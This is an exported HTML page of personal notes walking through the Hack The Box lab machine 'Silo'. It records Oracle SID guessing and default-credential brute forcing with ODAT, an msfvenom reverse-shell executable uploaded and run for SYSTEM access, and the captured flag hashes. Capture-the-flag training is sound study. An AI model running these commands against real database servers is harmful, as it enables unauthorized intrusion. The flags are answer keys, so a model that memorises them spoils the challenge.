<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>silo</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
<p><a href="#silo">silo</a></p>
<ol>
<li><a href="#nmap">nmap</a></li>
<li><a href="#Oracle Database Attack Tool">Oracle Database Attack Tool</a></li>
<ol>
<li><a href="#SID Guesser">SID Guesser</a></li>
<li><a href="#oracle default account wordlist">oracle default account wordlist</a></li>
<li><a href="#odat passwordguesser">odat passwordguesser</a></li>
<li><a href="#odat upload">odat upload</a></li>
<ol>
<li><a href="#odat utlfile -h">odat utlfile -h</a></li>
<li><a href="#msfvenom">msfvenom</a></li>
<li><a href="#utlfile">utlfile</a></li>
</ol>
<li><a href="#odat externaltable">odat externaltable</a></li>
</ol>
<li><a href="#user/root">user/root</a></li>
<li><a href="#lessons learned">lessons learned</a></li>
</ol></div>
<div class="page"><h1><b><u>silo</u></b></h1><img alt="images/689-1.png" src="images/689-1.png"/><br/><img alt="images/689-2.png" src="images/689-2.png"/></div></div>
</body></html><div class="page" id="silo"><h1><b><u>silo</u></b></h1><img alt="images/689-1.png" src="images/689-1.png"/><br/><img alt="images/689-2.png" src="images/689-2.png"/></div>
<div class="page" id="nmap"><h1><b><u>nmap</u></b></h1><span style="color:#ffa500;">nmap -sV -sC -oA nmap/silo 10.10.10.82</span><br/><img alt="images/690-1.png" src="images/690-1.png"/><br/><br/><br/><img alt="images/690-2.png" src="images/690-2.png"/><img alt="images/690-3.png" src="images/690-3.png"/></div>
<div class="page" id="Oracle Database Attack Tool"><h1><b><u>Oracle Database Attack Tool</u></b></h1><span style="color:#24ff00;">Since this box is using an oracle database, lets </span><span style="color:#ffa500;">apt -get install ODAT</span><br/><img alt="images/691-1.png" src="images/691-1.png"/><br/><img alt="images/691-2.png" src="images/691-2.png"/><br/><br/><span style="color:#24ff00;">Commands here:</span><br/><img alt="images/691-3.png" src="images/691-3.png"/></div>
<div class="page" id="SID Guesser"><h1><b><u>SID Guesser</u></b></h1><span style="color:#24ff00;">The first thing we need to enumerate is the Oracle System ID (SID) string. This is a string that is used to uniquely identify a particular database on a system. This can be done using the </span><span style="color:#ffa500;">sidguesser</span><span style="color:#24ff00;"> module in </span><span style="color:#ffa500;">ODAT</span><span style="color:#24ff00;">.<br/><br/></span><span style="color:#ffa500;">odat sidguesser -s 10.10.10.82 -p 1521</span><br/><img alt="images/692-1.png" src="images/692-1.png"/><br/><img alt="images/692-2.png" src="images/692-2.png"/></div>
<div class="page" id="oracle default account wordlist"><h1><b><u>oracle default account wordlist</u></b></h1><span style="color:#24ff00;">There is a special user wordlist stored within the metasploit-framework that is perfect for enumerating potential oracle database users located at</span><br/><span style="color:#ffa500;">/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt</span><br/><span style="color:#24ff00;">lets copy it over to our working directory </span><br/><img alt="images/694-1.png" src="images/694-1.png"/><br/><br/><span style="color:#24ff00;">The username and passwords in this list are separated by a space instead of a forward slash (/). We’ll have to change it to forward slash so that the ODAT tool is able to parse the file. This can be done in vi using the following command.</span><br/><br/><img alt="images/694-2.png" src="images/694-2.png"/><br/><span style="color:#ffa500;">:%s/ /\//g</span><br/><img alt="images/694-3.png" src="images/694-3.png"/><img alt="images/694-4.png" src="images/694-4.png"/><br/><br/><br/>Now that we have a proper list, we can use the passwordguesser module to brute force credentials.<br/><br/></div>
<div class="page" id="odat passwordguesser"><h1><b><u>odat passwordguesser</u></b></h1><span style="color:#ffa500;">odat passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file /root/Documents/htb/boxes/silo/ocacle_default_userpass.txt</span><br/><img alt="images/695-1.png" src="images/695-1.png"/><h1><br/><br/></h1><span style="color:#ffa500;">scott/tiger </span><span style="color:#24ff00;">worked!</span><br/><img alt="images/695-2.png" src="images/695-2.png"/></div>
<div class="page" id="odat upload"><h1><b><u>odat upload</u></b></h1><span style="color:#ffa500;">ODAT</span><span style="color:#24ff00;"> has a utlfile module that allows you to </span><span style="color:#ffff00;">upload</span><span style="color:#24ff00;">, </span><span style="color:#ffff00;">download</span><span style="color:#24ff00;"> or </span><span style="color:#ffff00;">delete</span><span style="color:#24ff00;"> a file. Since we are trying to get code execution on the box, let’s upload a malicious executable that sends a reverse shell back to our attack machine<br/></span><img alt="images/697-1.png" src="images/697-1.png"/></div>
<div class="page" id="odat utlfile -h"><h1><b><u>odat utlfile -h</u></b></h1><img alt="images/698-1.png" src="images/698-1.png"/></div>
<div class="page" id="msfvenom"><h1><b><u>msfvenom</u></b></h1><span style="color:#24ff00;">First, generate the executable using msfvenom.</span><br/><br/><span style="color:#ffa500;">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.62 LPORT=1234 -f exe &gt; shell.exe</span><br/><img alt="images/693-1.png" src="images/693-1.png"/></div>
<div class="page" id="utlfile"><h1><b><u>utlfile</u></b></h1><span style="color:#24ff00;">Next, upload the file using the </span><span style="color:#ffa500;">utlfile</span><span style="color:#24ff00;"> module to put our </span><span style="color:#ffa500;">shell.exe</span><span style="color:#ffff00;"> reverseshell payload </span><span style="color:#24ff00;">onto the server.</span><br/><br/><span style="color:#ffa500;">odat utlfile -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --putFile /temp shell.exe /root/Documents/htb/boxes/silo/shell.exe</span><br/><br/><span style="color:#24ff00;">We get the following error.<br/></span><img alt="images/696-1.png" src="images/696-1.png"/><br/><br/>We <span style="color:#ff0000;">don’t have sufficient privileges</span><span style="color:#24ff00;"> to upload a file. Let’s see if the user was given </span><span style="color:#ffff00;">sysdba</span><span style="color:#24ff00;"> privileges by adding the </span><span style="color:#ffa500;">--sysdba</span><span style="color:#24ff00;"> flag to our command.</span><br/><br/><span style="color:#ffa500;">odat utlfile -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --putFile /temp shell.exe /root/Documents/htb/boxes/silo/shell.exe --sysdba</span><br/><img alt="images/696-2.png" src="images/696-2.png"/><span style="color:#24ff00;"><br/>our upload was successful and stored onto the /temp directory on the 10.10.10.82 server according to odat's output, however, the /temp directory is not reachable on our webserver and dirbuster would take a while busting where the /temp directory<br/><br/>luckily, odat has a module that allows us to execute our .exe payload within its commandline called externaltable</span><br/><br/></div>
<div class="page" id="odat externaltable"><h1><b><u>odat externaltable</u></b></h1><span style="color:#ffa500;">odat</span> <span style="color:#ffa500;">externaltable -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --exec /temp shell.exe --sysdba</span><br/><br/><img alt="images/699-1.png" src="images/699-1.png"/><br/><br/><span style="color:#24ff00;">check back to our listener and we have connected to the box as </span><span style="color:#ffff00;">system</span><span style="color:#24ff00;">! no need to priv esc</span><br/><img alt="images/699-2.png" src="images/699-2.png"/></div>
<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/701-1.png" src="images/701-1.png"/><span style="color:#ffff00;"><br/>92ede778a1cc8d27cb6623055c331617<br/><br/></span><img alt="images/701-2.png" src="images/701-2.png"/><br/>cd39ea0af657a495e33bc59c7836faf6</div>
<div class="page" id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/>\<img alt="images/440-1.png" src="images/440-1.png"/></div>
